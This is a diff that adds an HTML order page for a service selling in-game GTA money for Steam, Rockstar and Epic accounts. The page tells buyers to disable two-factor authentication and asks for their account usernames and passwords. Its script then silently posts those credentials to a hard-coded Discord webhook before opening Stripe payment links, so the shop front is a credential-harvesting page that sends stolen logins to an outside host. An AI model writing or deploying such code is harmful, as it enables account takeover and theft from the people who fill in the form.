@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Majestic Millions - Order Form</title>
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;600&family=Raleway:wght@300;400;600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Raleway', sans-serif;
+      background: linear-gradient(135deg, #0f0f0f, #1c1c1c);
+      color: #e6e6e6;
+    }
+
+    header {
+      text-align: center;
+      padding: 60px 20px;
+      background: linear-gradient(135deg, #1c1c1c, #0f0f0f);
+    }
+
+    header img {
+      max-width: 250px;
+      margin-bottom: 30px;
+    }
+
+    h1 {
+      font-size: 3.5em;
+      color: #c29c68;
+    }
+
+    .form-container {
+      max-width: 800px;
+      margin: 60px auto;
+      padding: 40px 30px;
+      background: #121212;
+      border-radius: 15px;
+      border: 2px solid #c29c68;
+      text-align: center;
+    }
+
+    .form-container select, .form-container button, .form-container input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border-radius: 10px;
+      border: 1px solid #c29c68;
+      background-color: #181818;
+      color: #e6e6e6;
+      font-size: 1.1em;
+    }
+
+    .form-container button:hover {
+      background-color: #c29c68;
+    }
+
+    .form-container label {
+      display: block;
+      margin-top: 20px;
+    }
+
+    .warning {
+      color: #ff6f61;
+      font-weight: bold;
+      margin-bottom: 20px;
+      text-align: left;
+    }
+
+    .tutorials {
+      text-align: left;
+      font-size: 0.9em;
+      margin-top: 20px;
+    }
+
+    .tutorials a {
+      color: #c29c68;
+      text-decoration: none;
+    }
+
+    .tutorials a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <img src="https://i.imgur.com/rNTnavN.png" alt="Majestic Millions Logo">
+    <h1>Majestic Millions - Order Form</h1>
+    <p>Complete Your Order Below</p>
+  </header>
+
+  <div class="form-container">
+    <div class="warning">
+      <p>
+        Please make sure 2FA is turned off for all platforms selected, or else the order will not work.
+      </p>
+      <div class="tutorials">
+        <h3>How to Turn Off 2FA:</h3>
+        <ul>
+          <li>
+            <strong>Steam:</strong> Follow the steps in 
+            <a href="https://help.steampowered.com/en/faqs/view/06AF-2B44-44AA-7BBF" target="_blank">Steam's 2FA removal guide</a>.
+          </li>
+          <li>
+            <strong>Rockstar:</strong> Learn how to disable 2FA by visiting 
+            <a href="https://support.rockstargames.com/articles/360036008033" target="_blank">Rockstar's 2FA help page</a>.
+          </li>
+          <li>
+            <strong>Epic Games:</strong> Check out the steps for turning off 2FA at 
+            <a href="https://www.epicgames.com/help/en-US/epic-accounts-c74/account-security-c112/how-do-i-disable-two-factor-authentication-a3669" target="_blank">Epic Games support</a>.
+          </li>
+        </ul>
+      </div>
+    </div>
+
+    <h2>Select Platform</h2>
+    <select id="platformSelect" onchange="togglePlatformFields()">
+      <option value="">Select Platform</option>
+      <option value="steam">Steam + Rockstar</option>
+      <option value="epic">Epic Games</option>
+    </select>
+
+    <div id="steamFields" style="display: none;">
+      <h2>Enter Steam Login Credentials</h2>
+      <input type="text" id="steamUsername" placeholder="Steam Username">
+      <input type="password" id="steamPassword" placeholder="Steam Password">
+      <h2>Enter Rockstar Login Credentials</h2>
+      <input type="email" id="rockstarEmail" placeholder="Rockstar Email">
+      <input type="password" id="rockstarPassword" placeholder="Rockstar Password">
+    </div>
+
+    <div id="epicFields" style="display: none;">
+      <h2>Enter Epic Games Credentials</h2>
+      <input type="text" id="epicUsername" placeholder="Epic Username">
+      <input type="password" id="epicPassword" placeholder="Epic Password">
+    </div>
+
+    <h2>Enter Email</h2>
+    <input type="email" id="email" placeholder="Enter your email">
+    <h2>Confirm Email</h2>
+    <input type="email" id="confirmEmail" placeholder="Confirm your email">
+
+    <h2>Select Package</h2>
+    <select id="packageSelect">
+      <option value="15M">15M Bank - £0.99</option>
+      <option value="50M">50M Bank - £4.25</option>
+      <option value="100M">100M Bank - £7.50</option>
+      <option value="500M">500M Bank - £14.99</option>
+    </select>
+
+    <h2>Payment Confirmation</h2>
+    <label>
+      <input type="checkbox" id="paymentCheck"> I confirm the payment details.
+    </label>
+
+    <button id="payButton">Pay Now</button>
+    <p id="confirmationMessage"></p>
+  </div>
+
+  <script>
+    function togglePlatformFields() {
+      const platform = document.getElementById('platformSelect').value;
+      document.getElementById('steamFields').style.display = platform === 'steam' ? 'block' : 'none';
+      document.getElementById('epicFields').style.display = platform === 'epic' ? 'block' : 'none';
+    }
+
+    async function sendToWebhook(data) {
+      try {
+        const response = await fetch('https://discord.com/api/webhooks/1315868877200298056/neYt5Dh8BC9zrQf6SWWjs-yV44mm3JliAc7hb-mxJkIkOVUi-IgIbSArxSEKjFo7RZya', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: JSON.stringify(data, null, 2) })
+        });
+
+        return response.ok;
+      } catch (error) {
+        console.error('Error sending data to webhook:', error);
+        return false;
+      }
+    }
+
+    document.getElementById('payButton').addEventListener('click', async function () {
+      const platform = document.getElementById('platformSelect').value;
+      const email = document.getElementById('email').value;
+      const confirmEmail = document.getElementById('confirmEmail').value;
+      const selectedPackage = document.getElementById('packageSelect').value;
+      const paymentCheck = document.getElementById('paymentCheck').checked;
+
+      if (!platform || !email || !confirmEmail || !selectedPackage || !paymentCheck) {
+        alert('Please fill in all fields and confirm the payment.');
+        return;
+      }
+
+      if (email !== confirmEmail) {
+        alert('Emails do not match.');
+        return;
+      }
+
+      const data = {
+        platform,
+        email,
+        package: selectedPackage,
+        steamUsername: document.getElementById('steamUsername').value,
+        steamPassword: document.getElementById('steamPassword').value,
+        rockstarEmail: document.getElementById('rockstarEmail').value,
+        rockstarPassword: document.getElementById('rockstarPassword').value,
+        epicUsername: document.getElementById('epicUsername').value,
+        epicPassword: document.getElementById('epicPassword').value
+      };
+
+      const webhookSuccess = await sendToWebhook(data);
+
+      if (!webhookSuccess) {
+        alert('Failed to send data to the server.');
+        return;
+      }
+
+      let paymentUrl;
+
+      switch (selectedPackage) {
+        case '15M':
+          paymentUrl = 'https://buy.stripe.com/5kA3d49Y51PW0daeUX';
+          break;
+        case '50M':
+          paymentUrl = 'https://buy.stripe.com/9AQ7tk3zH3Y42li5km';
+          break;
+        case '100M':
+          paymentUrl = 'https://buy.stripe.com/28oeVM8U11PW8JG8wx';
+          break;
+        case '500M':
+          paymentUrl = 'https://buy.stripe.com/dR65lc2vD2U06By9AA';
+          break;
+        default:
+          alert('Invalid package selected.');
+          return;
+      }
+
+      window.open(paymentUrl, '_blank');
+    });
+  </script>
+</body>
+</html>
